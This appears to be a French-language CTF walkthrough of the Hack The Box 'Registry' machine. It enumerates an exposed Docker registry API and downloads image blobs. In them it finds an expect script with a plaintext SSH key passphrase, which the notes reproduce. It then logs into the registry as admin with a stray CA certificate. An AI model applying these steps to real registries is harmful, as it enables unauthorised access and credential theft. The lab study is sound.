# docker private registry

## lister les repo:

```
http://docker.registry.htb/v2/_catalog

{"repositories":["bolt-image"]}

http://docker.registry.htb/v2/bolt-image/tags/list

{"name":"bolt-image","tags":["latest"]}

http://docker.registry.htb/v2/bolt-image/manifests/latest

<cf fichier>, extrait:

"""
"fsLayers": [
   {
      "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"
   },
   {
      "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"
   },
   {
      "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"
   },
   {
      "blobSum": "sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7"
   },
   {
      "blobSum": "sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791"
   },
   {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
   },
   {
      "blobSum": "sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0"
   },
   {
      "blobSum": "sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a"
   },
   {
      "blobSum": "sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797"
   },
   {
      "blobSum": "sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff"
   }
],
""""
```
### on télécharge les blobs:

```
http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b
```
etc....


## dézipage des blobs...

## findings:

```bash
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

### passphrase clé ssh: GkOcz221Ftb3ugog

```bash
./sha256_c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7 (1)/root/.bash_history:39:ssh-keygen -t rsa -b 4096 -C "bolt@registry.htb"
```
### utilisation du certificats client qui traine:

```bash
michael@k:~/Documents/Projets/01HackTheBox/Registry$ sudo mkdir /etc/docker/certs.d/docker.registry.htb
michael@k:~/Documents/Projets/01HackTheBox/Registry$ mv /etc/docker/certs.d/ca.crt /etc/docker/certs.d/docker.registry.htb/
mv: impossible de déplacer '/etc/docker/certs.d/ca.crt' vers '/etc/docker/certs.d/docker.registry.htb/ca.crt': Permission non accordée
michael@k:~/Documents/Projets/01HackTheBox/Registry$ sudo mv /etc/docker/certs.d/ca.crt /etc/docker/certs.d/docker.registry.htb/

michael@k:~/Documents/Projets/01HackTheBox/Registry$ sudo docker login docker.registry.htb
Username: admin
Password:
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
```

## téléchargment du container:

```bash
sudo docker pull docker.registry.htb/bolt-image
```